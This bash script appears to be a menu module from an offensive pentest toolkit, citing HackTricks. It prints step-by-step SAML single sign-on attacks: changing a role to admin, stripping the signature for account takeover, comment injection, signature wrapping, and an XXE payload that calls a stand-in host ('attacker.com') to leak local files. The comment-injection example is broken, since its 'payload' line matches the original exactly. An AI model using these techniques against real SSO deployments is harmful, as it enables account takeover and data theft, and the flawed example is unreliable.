#!/bin/bash
# HackTricks Ref: saml-attacks
# Module: SAML Assertion Attacks (SSO Hacking)

echo -e "${C6}[WEB ATTACK: SAML_ATTACKS]${NC}"
echo -e "Reference: https://book.hacktricks.xyz/pentesting-web/saml-attacks"
echo -e "--------------------------------------------------"

echo -e "${C4}Select SAML Attack Vector:${NC}"
echo "1) SAML Response Manipulation (Change Username/Role)"
echo "2) Signature Exclusion Attack"
echo "3) XML Comment Injection (Truncation Attack)"
echo "4) XSW (XML Signature Wrapping) Theory"
echo "5) XXE in SAML Request/Response"
echo "0) Exit"

read -p "Selection: " saml_opt

case $saml_opt in
    1)
        echo -e "\n${C2}[*] Response Manipulation:${NC}"
        echo "If the assertion is not signed (or not validated), change the attributes:"
        echo "1. Intercept the SAMLResponse (Base64 encoded)."
        echo "2. Decode it and change: <saml:AttributeValue>user</saml:AttributeValue>"
        echo "3. To: <saml:AttributeValue>admin</saml:AttributeValue>"
        echo "4. Re-encode and forward."
        ;;
    2)
        echo -e "\n${C2}[*] Signature Exclusion:${NC}"
        echo "Test if the Service Provider (SP) validates the presence of a signature."
        echo "1. Delete the <ds:Signature> block entirely from the XML."
        echo "2. If the SP accepts the unsigned assertion, you have full ATO."
        ;;
    3)
        echo -e "\n${C2}[*] XML Comment Injection:${NC}"
        echo "Goal: Bypass string comparison by injecting comments."
        echo "Original: admin@target.com"
        echo "Payload:  admin@target.com"
        echo "If the parser ignores comments but the signature validator sees them, you can bypass validation."
        ;;
    4)
        echo -e "\n${C2}[*] XML Signature Wrapping (XSW):${NC}"
        echo "1. Copy a valid, signed assertion."
        echo "2. Paste a second, malicious assertion in the same XML."
        echo "3. The logic: The validator checks the valid one, but the app uses the malicious one."
        echo -e "${C4}Tool: Use 'SAML Raider' extension in Burp Suite.${NC}"
        ;;
    5)
        echo -e "\n${C2}[*] XXE in SAML:${NC}"
        echo "Since SAML is XML, try injecting an external entity in the DOCTYPE:"
        echo "Payload: <!DOCTYPE foo [ <!ENTITY xxe SYSTEM 'http://attacker.com/leak'> ]>"
        echo "Use this to leak local files or perform SSRF."
        ;;
    *) return ;;
esac

echo -e "\n--------------------------------------------------"
read -p "Press Enter to return..."
